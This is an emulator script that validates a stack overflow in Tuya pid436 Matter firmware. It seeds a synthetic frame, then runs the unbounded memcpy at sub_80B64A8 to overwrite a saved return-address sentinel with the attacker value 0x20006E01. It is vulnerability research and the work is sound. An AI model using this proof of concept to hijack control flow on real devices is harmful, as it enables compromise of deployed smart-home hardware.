@@ -1,0 +1,340 @@
+:name: MT-02 Tuya pid436 Matter sub_80B64A8 unbounded memcpy -> saved-LR -- validation
+:description: Drives the unbounded byte-wise memcpy sink sub_80B64A8 (memcpy(r0=dest,r1=src,r2=len), forward ascending, NO length bound) of the real Tuya pid436 Matter firmware on the emulated EFR32MG24. Mirrors the real vuln in caller sub_8050018 where an in-frame buffer at SP+0x28 sits 0x454 bytes below the saved LR at SP+0x47C. A synthetic caller frame reproduces that 0x454 distance: dest buffer @0x2000E000, sentinel saved-LR @dest+0x454, copy of len 0x458 crosses the sentinel and overwrites it with the attacker word 0x20006E01.
+#
+# Sink sub_80B64A8 @0x80B64A8: memcpy(dest=r0, src=r1, len=r2), forward byte-wise,
+#   dest ascending, NO bound -> writes dest[0..len-1]. push {r4,lr}; pop {r4,pc}.
+# Real caller sub_8050018: in-frame buffer SP+0x28, saved LR SP+0x47C, distance 0x454.
+# Synthetic frame: dest=0x2000E000, saved-LR sentinel @dest+0x454=0x2000E454=0xCAFED00D,
+#   src=0x2000F000, attacker word @src+0x454=0x2000F454=0x20006E01, len=0x458 (>0x454).
+#
+$bin=@scripts/silabs-vuln/mt02_tuya.elf
+include @scripts/silabs-vuln/boot_mg24.resc
+
+emulation RunFor "0.4"
+pause
+
+# --- SRC buffer @0x2000F000: fill 0x2000F000..0x2000F450 (277 dwords) with 0xCCCCCCCC filler,
+#     then the attacker word 0x20006E01 at src+0x454 = 0x2000F454 (this dword lands on dest+0x454).
+sysbus WriteDoubleWord 0x2000F000 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F004 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F008 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F00C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F010 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F014 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F018 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F01C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F020 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F024 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F028 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F02C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F030 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F034 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F038 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F03C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F040 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F044 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F048 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F04C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F050 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F054 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F058 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F05C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F060 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F064 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F068 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F06C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F070 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F074 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F078 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F07C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F080 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F084 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F088 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F08C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F090 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F094 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F098 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F09C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0A0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0A4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0A8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0AC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0B0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0B4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0B8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0BC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0C0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0C4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0C8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0CC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0D0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0D4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0D8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0DC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0E0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0E4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0E8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0EC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0F0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0F4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0F8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F0FC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F100 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F104 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F108 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F10C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F110 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F114 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F118 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F11C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F120 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F124 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F128 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F12C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F130 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F134 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F138 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F13C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F140 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F144 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F148 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F14C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F150 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F154 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F158 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F15C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F160 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F164 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F168 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F16C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F170 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F174 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F178 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F17C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F180 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F184 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F188 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F18C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F190 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F194 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F198 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F19C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1A0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1A4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1A8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1AC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1B0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1B4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1B8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1BC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1C0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1C4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1C8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1CC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1D0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1D4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1D8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1DC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1E0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1E4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1E8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1EC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1F0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1F4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1F8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F1FC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F200 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F204 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F208 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F20C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F210 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F214 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F218 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F21C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F220 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F224 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F228 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F22C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F230 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F234 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F238 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F23C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F240 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F244 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F248 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F24C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F250 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F254 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F258 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F25C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F260 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F264 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F268 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F26C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F270 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F274 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F278 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F27C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F280 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F284 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F288 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F28C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F290 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F294 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F298 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F29C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2A0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2A4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2A8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2AC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2B0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2B4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2B8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2BC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2C0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2C4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2C8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2CC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2D0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2D4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2D8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2DC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2E0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2E4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2E8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2EC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2F0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2F4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2F8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F2FC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F300 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F304 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F308 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F30C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F310 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F314 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F318 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F31C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F320 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F324 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F328 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F32C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F330 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F334 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F338 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F33C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F340 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F344 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F348 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F34C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F350 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F354 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F358 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F35C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F360 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F364 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F368 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F36C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F370 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F374 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F378 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F37C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F380 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F384 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F388 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F38C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F390 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F394 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F398 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F39C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3A0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3A4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3A8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3AC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3B0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3B4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3B8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3BC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3C0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3C4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3C8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3CC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3D0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3D4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3D8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3DC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3E0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3E4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3E8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3EC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3F0 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3F4 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3F8 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F3FC 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F400 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F404 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F408 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F40C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F410 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F414 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F418 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F41C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F420 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F424 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F428 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F42C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F430 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F434 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F438 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F43C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F440 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F444 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F448 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F44C 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F450 0xCCCCCCCC
+sysbus WriteDoubleWord 0x2000F454 0x20006E01
+
+# --- Pre-seed DEST saved-LR sentinel @dest+0x454 = 0x2000E454 = 0xCAFED00D ---
+sysbus WriteDoubleWord 0x2000E454 0xCAFED00D
+
+# --- Call contract: memcpy(dest=0x2000E000, src=0x2000F000, len=0x458) ---
+sysbus.cpu SetRegister 0  0x2000E000
+sysbus.cpu SetRegister 1  0x2000F000
+sysbus.cpu SetRegister 2  0x00000458
+sysbus.cpu SetRegister 13 0x2003FF00
+sysbus.cpu SetRegister 14 0x08006001
+sysbus.cpu PC 0x80B64A8
+
+echo ">>> BEFORE: dest+0x454 saved-LR slot @0x2000E454 (expect 0xCAFED00D) ="
+sysbus ReadDoubleWord 0x2000E454
+echo ">>> BEFORE: dest[0] @0x2000E000 (expect 0x00000000) ="
+sysbus ReadDoubleWord 0x2000E000
+
+# --- Run the ~1112-byte copy (~4.7 insns/byte => ~5200 insns). Split into 4x Step 2000. ---
+sysbus.cpu Step 2000
+sysbus.cpu Step 2000
+sysbus.cpu Step 2000
+sysbus.cpu Step 2000
+
+echo ">>> PC after stepping ="
+sysbus.cpu PC
+echo ">>> AFTER: dest[0] @0x2000E000 (expect 0xCCCCCCCC first src word) ="
+sysbus ReadDoubleWord 0x2000E000
+echo ">>> AFTER: dest+0x454 saved-LR slot @0x2000E454 (expect 0x20006E01 HIJACKED) ="
+sysbus ReadDoubleWord 0x2000E454
+
+# --- Corroborating short unbounded copy: dest2=0x2000A000, src2=0x2000B000, len=0x100.
+#     Sentinel at dest2+0xFC proves unboundedness at a second distance. ---
+sysbus WriteDoubleWord 0x2000B0FC 0xB16B00B5
+sysbus WriteDoubleWord 0x2000A0FC 0xDEADBEEF
+sysbus.cpu SetRegister 0  0x2000A000
+sysbus.cpu SetRegister 1  0x2000B000
+sysbus.cpu SetRegister 2  0x00000100
+sysbus.cpu SetRegister 13 0x2003FF00
+sysbus.cpu SetRegister 14 0x08006001
+sysbus.cpu PC 0x80B64A8
+echo ">>> BEFORE(short): dest2+0xFC @0x2000A0FC (expect 0xDEADBEEF) ="
+sysbus ReadDoubleWord 0x2000A0FC
+sysbus.cpu Step 1200
+echo ">>> AFTER(short): dest2+0xFC @0x2000A0FC (expect 0xB16B00B5 HIJACKED) ="
+sysbus ReadDoubleWord 0x2000A0FC
